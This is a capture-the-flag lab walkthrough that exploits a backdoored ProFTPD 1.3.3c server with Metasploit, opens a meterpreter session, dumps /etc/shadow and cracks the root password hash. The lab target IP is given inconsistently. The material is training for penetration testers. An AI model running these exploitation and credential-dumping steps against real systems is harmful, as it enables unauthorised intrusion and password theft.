# 🔬Hashes Dumping

## Lab 1 <a href="#lab-1" id="lab-1"></a>

> 🔬 [Password Cracker: Linux](https://attackdefense.com/challengedetails?cid=1776)
>
> * Target IP: `192.75.64.3`
> * **Password Hashes** dumping - `/etc/shadow`

### Enumeration

```bash
nmap -sV 192.87.153.3
```

```bash
Starting Nmap 7.70 ( https://nmap.org ) at 2024-07-22 03:52 UTC
Nmap scan report for target-1 (192.87.153.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
MAC Address: 02:42:C0:57:99:03 (Unknown)
Service Info: OS: Unix
```

* &#x20;A proftpd 1.3.3c server is discovered running on the target machine. Run nmap vuln script to identify the vulnerability.

```bash
nmap -sV --script vuln -p 21 192.87.153.3
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
| ftp-proftpd-backdoor: 
|   This installation has been backdoored.
|   Command: id
|_  Results: uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
|_sslv2-drown: 
MAC Address: 02:42:C0:57:99:03 (Unknown)
Service Info: OS: Unix
```

> The target proftpd installation has been running a backdoored vers&#x20;

```bash
searchsploit proftpd 1.3.3
```

<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

```bash
service postgresql start && msfconsole -q
msf5 > search proftpd
```

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Start a metasploit framework and exploit proftpd server using `exploit/unix/ftp/proftpd_133c_backdoor` module.

```bash
msf5 > setg RHOSTS 192.87.153.3
msf5 > use exploit/unix/ftp/proftpd_133c_backdoor
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
```

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Upgrade the sessions to a `meterpreter` session

```bash
# background the session with CTRL+Z
sessions -u 1
sessions # check available sessions
sessions 2
```

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
meterpreter > sysinfo
meterpreter > getuid
```

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Hashes Dumping <a href="#hashes-dumping" id="hashes-dumping"></a>

```bash
meterpreter > cat /etc/shadow
    root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7:::
```

<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Gather Linux Password hashes with `Metasploit`

```bash
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > search hashdump
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > use post/linux/gather/hashdump
msf5 post(linux/gather/hashdump) > options
msf5 post(linux/gather/hashdump) > sessions 
msf5 post(linux/gather/hashdump) > set SESSION 2
msf5 post(linux/gather/hashdump) > run
```

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20240722041512_default_192.87.153.3_linux.hashes_562294.txt
[*] Post module execution completed
```

* The _unshadowed password file_ is a file containing the format hashed password, ready to be cracked.

### Crack the Hash <a href="#crack-the-hash" id="crack-the-hash"></a>

```bash
search crack
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

<figure><img src="../../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `password`
{% endhint %}
